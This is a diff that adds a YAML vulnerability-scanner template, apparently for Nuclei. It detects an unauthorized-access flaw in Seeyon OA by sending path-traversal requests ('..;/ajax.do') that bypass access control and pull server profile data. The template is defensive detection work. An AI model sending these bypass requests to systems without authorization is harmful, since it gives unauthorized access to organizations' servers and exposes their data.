@@ -1,0 +1,52 @@
+id: seeyon-oa-ajax-idor
+info:
+  name: Seeyon OA Ajax Unauthorized Access
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    Detects unauthorized access vulnerabilities in Seeyon OA systems via specific ajax endpoints.
+    The template checks for improper access control and the presence of sensitive server information.
+  reference:
+    - https://mp.weixin.qq.com/s/bHKDSF7HWsAgQi9rTagBQA
+    - https://buaq.net/go-53721.html
+
+http:
+  - id: r0
+    method: GET
+    path:
+      - "{{BaseURL}}/seeyon/thirdpartyController.do.css/..;/ajax.do"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "java.lang.NullPointerException:null"
+        part: body
+
+  - id: r1
+    method: GET
+    path:
+      - "{{BaseURL}}/seeyon/personalBind.do.jpg/..;/ajax.do?method=ajaxAction&managerName=mMOneProfileManager&managerMethod=getOAProfile"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "MMOneProfile"
+          - "productTags"
+          - "serverIdentifier"
+        part: body
+      - type: word
+        words:
+          - "application/json"
+        part: header
+        condition: or
+        negative: false
+
+variables:
+  identifier: "seeyon-ajax-idor"  # Template context marker
+  retry: 0  # Retry counter to avoid over-query or rate-limit issues
